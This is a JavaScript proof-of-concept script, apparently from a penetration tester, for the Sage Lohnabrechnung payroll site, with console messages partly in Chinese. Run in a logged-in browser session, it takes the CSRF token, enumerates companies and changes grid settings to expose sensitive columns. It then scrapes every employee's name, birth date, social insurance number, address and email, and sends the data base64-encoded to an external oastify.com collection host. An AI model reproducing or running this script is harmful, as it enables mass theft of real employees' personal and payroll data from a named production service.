/**
 * Sage Lohnabrechnung — XSS impact PoC (authorized testing only)
 *
 * Run in DevTools Console while logged in on lohnabrechnung.sage.com.
 */
(async function lohnabrechnungEmployeeExtractPoC() {
  'use strict';

  const BASE =
    location.hostname === 'lohnabrechnung.sage.com'
      ? location.origin
      : 'https://lohnabrechnung.sage.com';

  if (location.hostname !== 'lohnabrechnung.sage.com') {
    console.warn(
      '⚠ 请在 lohnabrechnung.sage.com 标签页 Console 中运行，否则 fetch 不会带上登录 Cookie'
    );
  }
  const OAST_HOST = 'dizu9grner83yytrlm6afyksjjpad21r.oastify.com'; // set '' to skip exfil
  const GRID_COLUMNS = [
    'EmployeeNumber',
    'FirstName<img>',
    'LastName',
    'BirthDate',
    'Entry',
    'Exit',
    'JobType',
    'ExitReason',
    'SocialInsuranceNumber',
    'Action',
    'Sex',
    'Street',
    'ZipCode',
    'City',
    'Phone',
    'Mobile',
    'EMail',
  ];

  /** Fetch /companies — plain fetch, no extra headers (matches browser behavior) */
  async function fetchCompaniesPage() {
    console.log('📡 获取公司列表...');
    const resp = await fetch(`${BASE}/companies`, { credentials: 'include' });
    if (!resp.ok) throw new Error(`无法获取公司列表: ${resp.status}`);
    const html = await resp.text();
    console.log(`📄 /companies ${html.length} bytes`);
    return html;
  }

  /** Extract company IDs from HTML — regex on /companies/overview/{id} and /companies/{id}/... */
  function extractCompanyIds(html) {
    const ids = [];
    const regex = /\/companies\/(?:overview\/)?(\d+)/g;
    let match;
    while ((match = regex.exec(html)) !== null) {
      if (!ids.includes(match[1])) ids.push(match[1]);
    }
    if (!ids.length) {
      console.warn('⚠ extractCompanyIds: no match — HTML preview:', (html || '').slice(0, 400));
    }
    return ids;
  }

  async function fetchHtml(path) {
    const url = path.startsWith('http') ? path : `${BASE}${path}`;
    const resp = await fetch(url, { credentials: 'include' });
    if (!resp.ok) throw new Error(`${path} HTTP ${resp.status}`);
    return resp.text();
  }

  function decodeCfEmail(hex) {
    if (!hex || hex.length < 4) return '';
    const key = parseInt(hex.slice(0, 2), 16);
    let out = '';
    for (let i = 2; i < hex.length; i += 2) {
      out += String.fromCharCode(parseInt(hex.slice(i, i + 2), 16) ^ key);
    }
    return out;
  }

  function extractEmailFromCell(cell) {
    if (!cell) return '';
    const cf = cell.querySelector('[data-cfemail]');
    if (cf) {
      const decoded = decodeCfEmail(cf.getAttribute('data-cfemail'));
      if (decoded.includes('@')) return decoded;
    }
    const text = cleanText(cell.textContent).replace(/\s/g, '');
    if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(text)) return text;
    const m = (cell.innerHTML || '').match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/);
    return m ? m[0] : '';
  }

  function parseCsrfFromHtml(html) {
    if (!html) return null;
    const doc = new DOMParser().parseFromString(html, 'text/html');
    const input = doc.querySelector('input[name="_csrfToken"]');
    if (input?.value) return input.value;
    const m = html.match(/name="_csrfToken"\s+value="([^"]+)"/i);
    return m?.[1] || null;
  }

  function decodeHtmlEntities(s) {
    if (!s) return '';
    const ta = document.createElement('textarea');
    ta.innerHTML = s;
    return ta.value;
  }

  function cleanText(text) {
    if (!text) return '';
    return decodeHtmlEntities(text).replace(/\u00a0/g, ' ').replace(/\s+/g, ' ').trim();
  }

  /** Find employee grid root — NOT #SopEmployee_grid */
  function findEmployeeGrid(doc) {
    return (
      doc.querySelector('[data-test-key="mitarbeiterliste"]') ||
      doc.querySelector('[data-tag="GridEmployee"]') ||
      doc.querySelector('.new_Employee') ||
      doc
    );
  }

  /** Column index map from thead data-visible_columns="EmployeeNumber,LastName,..." */
  function buildColumnMap(doc) {
    const grid = findEmployeeGrid(doc);
    const headRow =
      grid.querySelector('thead tr[data-visible_columns]') ||
      doc.querySelector('thead tr[data-visible_columns]');

    const indexByName = {};
    let columnNames = [];

    if (headRow) {
      const raw = headRow.getAttribute('data-visible_columns') || '';
      columnNames = decodeHtmlEntities(raw)
        .split(',')
        .map((s) => s.trim())
        .filter(Boolean);
      columnNames.forEach((name, i) => {
        indexByName[name] = i;
      });
    }

    const idx = (...names) => {
      for (const n of names) {
        if (indexByName[n] !== undefined) return indexByName[n];
      }
      for (const n of names) {
        const hit = Object.keys(indexByName).find((k) =>
          k.toLowerCase().includes(n.toLowerCase())
        );
        if (hit) return indexByName[hit];
      }
      return -1;
    };

    return {
      columnNames,
      indexByName,
      employeeNumber: idx('EmployeeNumber'),
      firstName: idx('FirstName', 'FirstName<img>'),
      lastName: idx('LastName'),
      birthDate: idx('BirthDate'),
      entry: idx('Entry'),
      exit: idx('Exit'),
      jobType: idx('JobType'),
      exitReason: idx('ExitReason'),
      socialInsuranceNumber: idx('SocialInsuranceNumber'),
      sex: idx('Sex'),
      street: idx('Street'),
      zipCode: idx('ZipCode'),
      city: idx('City'),
      phone: idx('Phone'),
      mobile: idx('Mobile'),
      email: idx('EMail', 'Email', 'E-Mail'),
    };
  }

  function extractEmployeesFromHTML(html, companyId) {
    const doc = new DOMParser().parseFromString(html, 'text/html');
    const grid = findEmployeeGrid(doc);
    const rows = grid.querySelectorAll('tbody tr[data-id]');
    const col = buildColumnMap(doc);

    console.log(`  company ${companyId}: ${rows.length} rows, columns:`, col.columnNames);

    if (!rows.length) {
      console.warn(`  ⚠ no tbody tr[data-id] — check URL /companies/${companyId}/employees`);
      return [];
    }

    const employees = [];

    rows.forEach((row) => {
      const cells = row.querySelectorAll('td.grid-data, td');
      if (cells.length < 3) return;

      const get = (i) => (i >= 0 && cells[i] ? cleanText(cells[i].textContent) : '');

      const emp = {
        companyId,
        rowId: row.getAttribute('data-id'),
        employeeNumber: get(col.employeeNumber),
        firstName: get(col.firstName),
        lastName: get(col.lastName),
        birthDate: get(col.birthDate),
        entry: get(col.entry),
        exit: get(col.exit),
        jobType: get(col.jobType),
        exitReason: get(col.exitReason),
        socialInsuranceNumber: get(col.socialInsuranceNumber),
        street: get(col.street),
        zipCode: get(col.zipCode),
        city: get(col.city),
        phone: get(col.phone),
        mobile: get(col.mobile),
        email: extractEmailFromCell(col.email >= 0 ? cells[col.email] : null),
      };

      emp.fullName = [emp.firstName, emp.lastName].filter(Boolean).join(' ').trim() || emp.lastName;

      const editLink = row.querySelector('a[href*="/employees/"]');
      if (editLink) {
        const m = editLink.getAttribute('href').match(/employees\/(\d+)/);
        if (m) emp.employeeId = m[1];
      }

      if (emp.employeeNumber || emp.lastName || emp.fullName) employees.push(emp);
    });

    return employees;
  }

  /** POST only — PUT often blocked / not needed (Burp uses POST successfully) */
  async function storeGridPreferences(csrfToken, refererPath) {
    const body = new URLSearchParams();
    body.set('key', 'grid.config.SopEmployee');
    GRID_COLUMNS.forEach((c) => body.append('value[]', c));
    body.set('_csrfToken', csrfToken);

    const headers = {
      'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
      'X-Requested-With': 'XMLHttpRequest',
      'X-Csrf-Token': csrfToken,
      Accept: 'text/plain, */*; q=0.01',
      Referer: `${BASE}${refererPath}`,
    };

    const resp = await fetch(`${BASE}/settings/preferences/store`, {
      method: 'POST',
      credentials: 'include',
      headers,
      body: body.toString(),
    });

    const text = await resp.text();
    console.log('[POST] preferences/store →', resp.status, text.slice(0, 200));
    if (!resp.ok) throw new Error(`preferences/store failed: HTTP ${resp.status}`);
    return { status: resp.status, body: text };
  }

  function base64Encode(str) {
    return btoa(unescape(encodeURIComponent(str)));
  }

  async function exfil(data) {
    if (!OAST_HOST) return;
    const payload = base64Encode(JSON.stringify(data));
    await fetch(`https://${OAST_HOST}/collect`, {
      method: 'POST',
      mode: 'no-cors',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: `data=${encodeURIComponent(payload)}`,
    });
    console.log(`📤 exfil ${data.length} records`);
  }

  try {
    console.log('🚀 start', BASE);

    const companyHtml = await fetchCompaniesPage();
    const csrf = parseCsrfFromHtml(companyHtml);
    if (!csrf) throw new Error('CSRF not found on /companies');
    console.log('🔑 CSRF:', csrf.slice(0, 8) + '...');

    let companyIds = extractCompanyIds(companyHtml);

    if (companyIds.length === 0) {
      companyIds = extractCompanyIds(document.documentElement.outerHTML);
      if (companyIds.length) console.log('🏢 从当前页面 DOM 补充公司 ID');
    }

    console.log(`🏢 找到 ${companyIds.length} 个公司:`, companyIds);

    if (companyIds.length === 0) {
      console.warn('⚠️ 未找到任何公司ID — 请先打开 https://lohnabrechnung.sage.com/companies 并确认已登录');
      return;
    }

    await storeGridPreferences(csrf, '/companies');
    await new Promise((r) => setTimeout(r, 800));

    let all = [];

    for (const companyId of companyIds) {
      const path = `/companies/${companyId}/employees`;
      console.log(`📋 GET ${path}`);

      const empHtml = await fetchHtml(`/companies/${companyId}/employees?_=${Date.now()}`);
      const emps = extractEmployeesFromHTML(empHtml, companyId);

      console.log(`  ✅ parsed ${emps.length} employees`);
      emps.forEach((e, i) =>
        console.log(
          `    ${i + 1}. #${e.employeeNumber} ${e.fullName} | SV:${e.socialInsuranceNumber || '-'} | ${e.email || 'no email'}`
        )
      );

      all = all.concat(emps);
    }

    console.log(`📊 total ${all.length}`);
    console.table(
      all.map((e) => ({
        company: e.companyId,
        nr: e.employeeNumber,
        name: e.fullName,
        birth: e.birthDate,
        sv: e.socialInsuranceNumber,
        email: e.email,
      }))
    );

    const b64 = base64Encode(JSON.stringify(all, null, 2));
    console.log('📋 base64 length:', b64.length);
    console.log(b64);

    await exfil(all);
    return all;
  } catch (e) {
    console.error('❌', e);
    throw e;
  }
})();
